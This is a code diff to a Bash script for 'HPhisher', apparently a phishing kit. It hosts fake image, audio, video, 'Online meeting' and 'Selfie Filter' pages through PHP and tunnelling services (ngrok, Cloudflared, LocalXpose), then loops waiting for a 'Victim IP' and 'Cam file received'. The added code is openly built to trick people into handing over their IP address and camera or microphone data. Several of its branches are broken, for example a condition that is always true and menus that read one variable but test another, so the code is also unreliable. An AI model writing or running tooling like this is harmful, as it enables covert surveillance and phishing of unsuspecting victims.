@@ -219,6 +219,8 @@ update() {
 
 }
 
+HOST='127.0.0.1'
+PORT='4444'
 
 ## Shortcut
 shortut_check() {
@@ -227,31 +229,6 @@ shortut_check() {
 	else
 		shortcut
 	fi
-}
-shortcut() {
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Do you want to setup shortcut (Y/n) : ${BLUE}" shortcut_reply
-		case $shortcut_reply in
-		Y | y)
-			shortcut_setup;;
-		N | n)
-			echo "";;
-		*)
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${RED} Invaild option try again."
-			shortcut_check;;
-		esac
-}
-shortcut_setup() {
-	rm -rf /bin/hphisher
-	shortcutcmd = "pro_dir = ${pro_dir}"
-	"if [[ -d "${pro_dir}" ]]; then
-		bash ${pro_dir}/hphisher.sh
-	else
-		echo -e "\n [-] HPhisher directory not found. It maybe moved or deleted try downloading HPhisher again. "
-	fi
-	"
-	echo ${shortcutcmd} >> hphisher
-	chmod 777 hphisher
-	mv hphisher /bin
 }
 
 ## Install ngrok
@@ -364,7 +341,7 @@ start_cloudflared() {
 }
 
 ## Install LocalXpose
-install_localxpose() {
+install_loclx() {
 	if [[ -e ".server/loclx" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
 	else
@@ -382,7 +359,7 @@ install_localxpose() {
 	fi
 }
 
-auth_localxpose() {
+auth_loclx() {
 	./.server/loclx -help > /dev/null 2>&1 &
 	sleep 1
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"
@@ -402,7 +379,7 @@ auth_localxpose() {
 ## Start LocalXpose
 start_loclx() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; auth_localxpose; }
+	{ sleep 1; setup_site; auth_loclx; }
 	echo -e "\n"
 	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
@@ -456,4 +433,203 @@ start_localhost() {
         { sleep 1; clear; banner; }
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
         capture_data_check
+}
+
+setup_site() {
+        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+        cp -rf .sites/"$site_name"/"$site_template"/* .server/www
+        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+        cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+}
+
+#Capture data check
+capture_data_check(){
+	      if [ site_name=image ];then
+                capture_data_image
+        elif [ site_name=audio ];then
+                capture_data_audio
+        elif [ site_name=video ];then
+                capture_data_video
+			 elif [ site_name=video ];then
+			           capture_data_video_audio
+	      else
+	    	echo " Error Occured!!"
+        fi
+}
+
+capture_data_image() {
+        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+  while true; do
+                if [[ -e ".server/www/ip.txt" ]]; then
+                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+                        capture_ip
+                        rm -rf .server/www/ip.txt
+                fi
+                sleep 0.75
+								if [[ -e "Log.log" ]]; then
+									printf "${GREEN} Cam file received! ${NC}"
+									rm -rf Log.log
+								fi
+                sleep 0.5
+	done
+}
+mainmenu() {
+echo -e " "
+echo -e " "
+echo -e " "
+banner
+echo -e " "
+echo -e " "
+echo -e "${RED} CHOOSE A SITE : ${NC}"
+echo -e " "
+echo -e " "
+echo -e "${BLUE} [1] ${GREEN} Image ${NC}"
+echo -e "${BLUE} [2] ${GREEN} Audio ${NC}"
+echo -e "${BLUE} [3] ${GREEN} Video ${NC}"
+echo -e "${BLUE} [4] ${GREEN} Video+Audio ${NC}"
+echo -e " "
+echo -e "${BLUE} [A] ${RED} About ${NC}"
+echo -e "${BLUE} [B] ${RED} Request A site ${NC}"
+echo -e "${BLUE} [C] ${RED} Report an Issue ${NC}"
+echo -e "${BLUE} [D] ${RED} View Logs ${NC}"
+echo -e "${BLUE} [E] ${RED} Check for Updates ${NC}"
+echo -e "${BLUE} [00] ${RED} Exit ${NC}"
+echo -e " "
+echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Enter your choice : ${BLUE}"
+read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher : ${BLUE}" reply_site
+echo " "
+case $reply_site in
+        1 | 01)
+								site_name=image
+                site_image;;
+        2 | 02)
+							 site_name=audio
+                site_audio;;
+				3 | 03)
+								site_name=video
+                site_video;;
+       	4 | 04)
+				        site_name=video_audio
+	            	site_video_audio;;
+				A | a)
+			  				xdg-open https://github.com/HPhisher/NPhisher
+								{ sleep 2; clear;  banner; mainmenu; };;
+				B | b | C | c)
+				   			xdg-open https://github.com/HPhisher/NPhisher/issues/new
+								{ sleep 2; clear; banner; mainmenu; };;
+				D | d)
+			      		if [ -f logs.dat ];then
+						 				cat logs.dat
+								else
+										echo -ne "\n${RED}[${WHITE}!${RED}]${RED} No logs data found!!"
+										{ sleep 2; clear; mainmenu; }
+								fi;;
+				E | e)
+								check_update;;
+				0 | 00)
+    							msg_exit;;
+		 		*)
+				echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+		           { sleep 1; clear; mainmenu; };;
+esac
+}
+
+## Tunnel selection
+tunnel_menu() {
+echo -e " "
+echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
+echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
+echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
+echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
+echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select a port forwarding service : ${BLUE}"
+read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} : ${BLUE}" reply_tunnel
+
+        case $reply_tunnel in
+                1 | 01)
+                        start_localhost;;
+                2 | 02)
+											  install_ngrok
+												start_ngrok;;
+                3 | 03)
+												install_cloudflared
+												start_cloudflared;;
+	            	4 | 04)
+												install_loclx
+												start_loclx;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; tunnel_menu; };;
+        esac
+}
+
+site_image(){
+echo -e "${BLUE}[01]${CYAN} Default ${NC}"
+echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
+read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
+case $choice in
+        1 | 01)
+                site_template="default"
+                tunnel_menu;;
+        *)
+                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; site_image; };;
+esac
+}
+
+site_audio(){
+echo -e "${BLUE}[01]${CYAN} Default ${NC}"
+echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
+read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
+case $choice in
+        1 | 01)
+                site_template="default"
+                tunnel_menu;;
+        *)
+                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; site_audio; };;
+esac
+}
+
+site_video(){
+echo -e "${BLUE}[01]${CYAN} Default ${NC}"
+echo -e "${BLUE}[01]${CYAN} Online meeting ${NC}"
+echo -e "${BLUE}[01]${CYAN} Selfie Filter ${NC}"
+echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
+read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
+case $choice in
+        1 | 01)
+                site_template="default"
+                tunnel_menu;;
+			  2 | 02)
+				        site_template="onlinemeet"
+                tunnel_menu;;
+				3 | 03)
+								site_template="filter"
+								tunnel_menu;;
+        *)
+                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; site_video; };;
+esac
+}
+
+site_video_audio(){
+echo -e "${BLUE}[01]${CYAN} Default ${NC}"
+echo -e "${BLUE}[01]${CYAN} Online meeting ${NC}"
+echo -e "${BLUE}[01]${CYAN} Selfie Filter ${NC}"
+echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
+read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
+case $choice in
+        1 | 01)
+                site_template="default"
+                tunnel_menu;;
+			  2 | 02)
+				        site_template="onlinemeet"
+                tunnel_menu;;
+				3 | 03)
+								site_template="filter"
+								tunnel_menu;;
+        *)
+                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; site_video_audio; };;
+esac
 }
